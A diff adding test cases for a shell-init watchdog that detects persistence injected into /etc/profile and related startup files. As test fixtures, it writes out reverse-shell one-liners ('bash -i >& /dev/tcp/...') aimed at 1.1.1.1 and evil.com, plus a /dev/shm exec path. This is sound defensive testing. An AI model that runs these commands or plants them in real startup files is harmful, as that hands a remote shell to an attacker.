@@ -197,3 +197,52 @@ seed_benign() {
     main_count=$(cap | grep -cE '^-t selfdef-shell-init -- ')
     [ "${main_count}" = "1" ]
 }
+
+@test "INVARIANT (no auto-trust): shell-init-watchdog does NOT refresh baseline on injection detection — alert STAYS until operator updates" {
+    # T1546 per-login exec persistence — injection alert MUST persist
+    # across runs until operator explicitly re-baselines.
+    seed_benign
+    run_wd
+    printf 'bash -i >& /dev/tcp/1.1.1.1/4444 0>&1\n' > "${PROFILE_F}"
+    : > "${SELFDEF_TEST_LOGCAP}"
+    run_wd                                              # first delta — alert
+    : > "${SELFDEF_TEST_LOGCAP}"
+    run_wd                                              # alert STAYS
+    cap | grep -q '"event":"shell_init_suspicious_pattern"'
+    cap | grep -q '"severity":"alert"'
+}
+
+@test "INVARIANT (commented injection pattern NOT flagged: # prefix filtered)" {
+    # /etc/profile is /bin/sh; # comments. Operator notes about
+    # hypothetical attack patterns must NOT trigger alert.
+    seed_benign
+    run_wd
+    : > "${SELFDEF_TEST_LOGCAP}"
+    printf '# /etc/profile\n# example attack: bash -i >& /dev/tcp/evil.com/4444 0>&1\nexport EDITOR=vi\n' > "${PROFILE_F}"
+    run_wd
+    ! cap | grep -q '"event":"shell_init_suspicious_pattern"'
+    ! cap | grep -q '"severity":"alert"'
+}
+
+@test "INVARIANT (multi-file scan: /etc/profile + /etc/bash.bashrc + /etc/zsh/zshrc + /etc/profile.d/*.sh axes — injection in ANY → alert)" {
+    # Shell-init has 4 main file families. Lock multi-file axis.
+    PROFILE_F2="${TMP}/bash.bashrc"
+    seed_benign
+    FILES_V="${PROFILE_F} ${PROFILE_F2}" run_wd
+    : > "${SELFDEF_TEST_LOGCAP}"
+    # Plant injection in bash.bashrc.
+    printf '# /etc/bash.bashrc\nbash -i >& /dev/tcp/1.1.1.1/4444 0>&1\n' > "${PROFILE_F2}"
+    FILES_V="${PROFILE_F} ${PROFILE_F2}" run_wd
+    cap | grep -q '"severity":"alert"'
+}
+
+@test "INVARIANT (/dev/shm tmpfs writable-root exec → alert)" {
+    # /dev/shm is tmpfs world-writable. Lock coverage alongside
+    # /tmp + /var/tmp + /home writable-root family.
+    seed_benign
+    run_wd
+    : > "${SELFDEF_TEST_LOGCAP}"
+    printf '/dev/shm/.callback\n' > "${PROFILE_F}"
+    run_wd
+    cap | grep -q '"severity":"alert"'
+}
